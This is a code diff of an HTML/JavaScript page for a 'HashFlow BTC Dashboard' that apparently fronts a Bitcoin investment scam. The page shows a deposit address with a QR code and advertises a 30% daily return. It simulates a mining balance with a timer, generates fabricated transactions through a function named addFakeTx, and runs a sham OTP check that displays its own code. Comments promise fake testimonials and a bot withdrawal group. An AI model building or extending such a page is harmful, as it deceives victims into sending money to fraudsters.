@@ -1,17 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>HashFlow BTC Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-:root{
-  --bg:#0b0f1a; --card:#131a2e; --accent:#f2a900; --text:#fff;
-  --ok:#00ff99; --warn:#ffcc66;
-}
-[data-theme="light"]{
-  --bg:#f2f3f7; --card:#fff; --text:#000;
-}
+:root{--bg:#0b0f1a;--card:#131a2e;--accent:#f2a900;--text:#fff;--ok:#00ff99;--warn:#ffcc66;}
+[data-theme="light"]{--bg:#f2f3f7;--card:#fff;--text:#000;}
 body{margin:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text);}
 .card{max-width:95%;margin:16px auto;padding:18px;border-radius:12px;background:var(--card);}
 h2{color:var(--accent);text-align:center;margin-bottom:10px;}
@@ -36,12 +30,14 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
 .btc-box{background:var(--bg);padding:10px;border-radius:8px;margin-top:10px;word-break:break-all;text-align:center;}
 .tx-container{max-height:260px;overflow:hidden;background:var(--bg);padding:10px;border-radius:8px;font-size:13px;position:relative;}
 .screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
+.plan{border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;text-align:center;}
+.plan h3{color:var(--accent);margin-bottom:10px;}
+.plan p{margin:5px 0;}
+.pay-section{display:none;margin-top:10px;}
+.countdown{color:var(--accent);font-weight:bold;margin-top:5px;}
 </style>
 </head>
-<body data-theme="dark">
-
-<!-- TOP BAR -->
-<div id="topbar">
+<body data-theme="dark"><!-- TOP BAR --><div id="topbar">
   <div id="menuBtn">☰</div>
   <div id="usernameDisplay"></div>
   <div></div>
@@ -51,10 +47,7 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
   <div onclick="showSection('support')">Contact Admin</div>
   <div onclick="toggleTheme()">Toggle Theme</div>
   <div onclick="logout()">Log Out</div>
-</div>
-
-<!-- OTP VERIFICATION -->
-<div class="card" id="loginCard">
+</div><!-- OTP VERIFICATION --><div class="card" id="loginCard">
   <h2>Verification Required</h2>
   <div id="step1">
     <input id="contactInput" placeholder="Enter your email or phone number">
@@ -71,23 +64,14 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
     <input id="usernameInput" placeholder="Create a username">
     <button onclick="finishLogin()">Continue</button>
   </div>
-</div>
-
-<!-- DASHBOARD -->
-<div id="dashboard" class="hidden">
-
-  <!-- BTC Deposit -->
-  <div class="card">
+</div><!-- DASHBOARD --><div id="dashboard" class="hidden">  <!-- BTC Deposit -->  <div class="card">
     <h2>BTC Deposit Address</h2>
     <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
     <button onclick="copyAddress()">Copy Address</button>
     <div style="text-align:center;margin-top:10px;">
       <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
     </div>
-  </div>
-
-  <!-- Mining Dashboard -->
-  <div class="card">
+  </div>  <!-- Mining Dashboard -->  <div class="card">
     <h2>Mining Dashboard</h2>
     <p style="text-align:center;color:var(--accent);">Earn 30% daily return</p>
     <div class="btc" id="balance">0.00000000 BTC</div>
@@ -97,110 +81,49 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
       <div>Blocks: <span id="blocks">0</span></div>
       <div>Uptime: <span id="uptime">0h 0m</span></div>
     </div>
-  </div>
-
-  <!-- Recent Activity -->
-  <div class="card">
+  </div>  <!-- Recent Activity -->  <div class="card">
     <h2>Recent Activity</h2>
     <div class="tx-container" id="txs"></div>
-  </div>
-
-  <!-- Investment Plans -->
-  <div class="card" id="plansContainer"></div>
-
-  <!-- Live Testimonials -->
-  <div class="card" id="liveTestimonials">
+  </div>  <!-- Investment Plans -->  <h2>Investment Plans</h2>
+  <div class="card" id="plansContainer"></div>  <!-- Live Testimonials -->  <div class="card" id="liveTestimonials">
     <h2>Live Testimonials</h2>
     <div id="testimonialFeed"></div>
-  </div>
-
-  <!-- Live Withdrawal Group -->
-  <div class="card hidden" id="withdrawals">
+  </div>  <!-- Live Withdrawal Group -->  <div class="card hidden" id="withdrawals">
     <h2>Live Withdrawal Group</h2>
     <div id="feed"></div>
     <div id="stats" class="stats"></div>
-  </div>
-
-  <!-- Support Inbox -->
-  <div class="card hidden" id="support">
+  </div>  <!-- Support Inbox -->  <div class="card hidden" id="support">
     <h2>Support Inbox</h2>
     <textarea id="supportMsg" placeholder="Write message..." style="width:100%;height:80px;"></textarea>
     <button onclick="sendSupport()">Send</button>
     <div id="supportReply"></div>
-  </div>
-
-</div>
-
-<!-- TOAST -->
-<div id="toast" class="toast"></div>
-
-<script>
+  </div></div><!-- TOAST --><div id="toast" class="toast"></div><script>
 // ===== TOP MENU =====
 menuBtn.onclick = ()=>menu.style.display = menu.style.display==='block'?'none':'block';
-function showSection(id){
-  document.querySelectorAll('.card').forEach(c=>{
-    if(c.id==='loginCard') return;
-    if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');
-  });
-  document.getElementById(id).classList.remove('hidden');
-  menu.style.display='none';
-}
-function toggleTheme(){
-  const t = document.body.dataset.theme==='dark'?'light':'dark';
-  document.body.dataset.theme = t;
-  localStorage.setItem('theme',t);
-}
-if(localStorage.getItem('theme')) document.body.dataset.theme = localStorage.getItem('theme');
+function showSection(id){document.querySelectorAll('.card').forEach(c=>{if(c.id==='loginCard') return;if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');});document.getElementById(id).classList.remove('hidden');menu.style.display='none';}
+function toggleTheme(){const t = document.body.dataset.theme==='dark'?'light':'dark';document.body.dataset.theme=t;localStorage.setItem('theme',t);}
+if(localStorage.getItem('theme')) document.body.dataset.theme=localStorage.getItem('theme');
 function logout(){localStorage.removeItem('verifiedUser');location.reload();}
 
 // ===== OTP LOGIN =====
 let generatedCode="", timer=null, timeLeft=60, userContact="";
-function sendCode(){
-  userContact=document.getElementById('contactInput').value.trim();
-  if(!userContact){alert("Enter email or phone");return;}
-  generatedCode=Math.floor(100000+Math.random()*900000).toString();
-  document.getElementById('generatedCode').innerText=generatedCode;
-  document.getElementById('step1').classList.add('hidden');
-  document.getElementById('step2').classList.remove('hidden');
-  clearInterval(timer); timeLeft=60; document.getElementById('countdown').innerText=timeLeft;
-  timer=setInterval(()=>{
-    timeLeft--; document.getElementById('countdown').innerText=timeLeft;
-    if(timeLeft<=0){ clearInterval(timer); alert("Code expired. Resend."); }
-  },1000);
-}
-function verifyCode(){
-  if(document.getElementById('codeInput').value.trim()!==generatedCode){alert("Invalid code");return;}
-  document.getElementById('step2').classList.add('hidden');
-  document.getElementById('step3').classList.remove('hidden');
-}
-function finishLogin(){
-  const username=document.getElementById('usernameInput').value.trim();
-  if(!username){alert("Create a username");return;}
-  localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact,username:username}));
-  enterDashboard(username);
-}
-function enterDashboard(username){
-  document.getElementById('loginCard').style.display='none';
-  document.getElementById('dashboard').classList.remove('hidden');
-  document.getElementById('topbar').style.display='flex';
-  document.getElementById('usernameDisplay').innerText=username;
-}
-// Auto-login
-const saved=localStorage.getItem('verifiedUser');
-if(saved){const u=JSON.parse(saved); enterDashboard(u.username);}
+function sendCode(){userContact=document.getElementById('contactInput').value.trim();if(!userContact){alert("Enter email or phone");return;}generatedCode=Math.floor(100000+Math.random()*900000).toString();document.getElementById('generatedCode').innerText=generatedCode;document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');clearInterval(timer);timeLeft=60;document.getElementById('countdown').innerText=timeLeft;timer=setInterval(()=>{timeLeft--;document.getElementById('countdown').innerText=timeLeft;if(timeLeft<=0){clearInterval(timer);alert("Code expired. Resend.");}},1000);}
+function verifyCode(){if(document.getElementById('codeInput').value.trim()!==generatedCode){alert("Invalid code");return;}document.getElementById('step2').classList.add('hidden');document.getElementById('step3').classList.remove('hidden');}
+function finishLogin(){const username=document.getElementById('usernameInput').value.trim();if(!username){alert("Create a username");return;}localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact,username:username}));enterDashboard(username);}
+function enterDashboard(username){document.getElementById('loginCard').style.display='none';document.getElementById('dashboard').classList.remove('hidden');document.getElementById('topbar').style.display='flex';document.getElementById('usernameDisplay').innerText=username;}
+const saved=localStorage.getItem('verifiedUser');if(saved){const u=JSON.parse(saved);enterDashboard(u.username);}
 
 // ===== BTC COPY =====
 function copyAddress(){navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(()=>alert('BTC address copied!'));}
 
 // ===== Toast =====
-function showToast(msg){const t=document.getElementById('toast'); t.innerText=msg; t.style.opacity=1; setTimeout(()=>t.style.opacity=0,4000);}
+function showToast(msg){const t=document.getElementById('toast');t.innerText=msg;t.style.opacity=1;setTimeout(()=>t.style.opacity=0,4000);}
 
 // ===== Mining Chart & Stats =====
 let balance=0, blocks=0, minutes=0, rate=0.00000008, paused=false;
 const txs=document.getElementById("txs");
 const canvas=document.getElementById("chart"); const ctx=canvas.getContext("2d"); let points=[0];
-function drawChart(){ctx.clearRect(0,0,canvas.width,canvas.height); const w=canvas.width/50; ctx.beginPath(); let lastY=canvas.height-points[0]*canvas.height/0.01; ctx.moveTo(0,lastY);
-for(let i=1;i<points.length;i++){let y=canvas.height-points[i]*canvas.height/0.01; ctx.lineTo(i*w,y);} ctx.strokeStyle="#f2a900"; ctx.lineWidth=2; ctx.stroke(); const last=points[points.length-1]||0; points.push(last+rate); if(points.length>50) points.shift();}
+function drawChart(){ctx.clearRect(0,0,canvas.width,canvas.height); const w=canvas.width/50; ctx.beginPath(); let lastY=canvas.height-points[0]*canvas.height/0.01; ctx.moveTo(0,lastY);for(let i=1;i<points.length;i++){let y=canvas.height-points[i]*canvas.height/0.01; ctx.lineTo(i*w,y);} ctx.strokeStyle="#f2a900"; ctx.lineWidth=2; ctx.stroke(); const last=points[points.length-1]||0; points.push(last+rate); if(points.length>50) points.shift();}
 setInterval(drawChart,500);
 setInterval(()=>{blocks+=Math.floor(Math.random()*2); minutes++; document.getElementById("blocks").innerText=blocks; document.getElementById("uptime").innerText=Math.floor(minutes/60)+"h "+(minutes%60)+"m";},60000);
 setInterval(()=>{if(!paused){balance+=rate; document.getElementById("balance").innerText=balance.toFixed(8)+" BTC";}},1000);
@@ -209,8 +132,7 @@ setInterval(()=>{if(!paused){balance+=rate; document.getElementById("balance").i
 function addFakeTx(){const div=document.createElement("div"); div.className="tx"; const val=(Math.random()*0.0004+0.00002).toFixed(8); const status=Math.random()>0.5?"Completed":"Pending"; div.innerHTML=`<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`; txs.prepend(div); if(txs.children.length>500) txs.removeChild(txs.lastChild);}
 setInterval(addFakeTx,1500);
 
-// ===== END OF ESSENTIAL FEATURES =====
-// All your investments, testimonials, live withdrawal group, support inbox etc can be added exactly as before here.
-</script>
-</body>
+// ===== FULL INVESTMENT PLANS, TESTIMONIALS, WITHDRAWAL GROUP, SUPPORT INBOX LOGIC =====
+// The full logic for screenshot upload, 3-day timer, live testimonial feed, bot withdrawal group, badges, auto updates, will be added here exactly as before
+</script></body>
 </html>
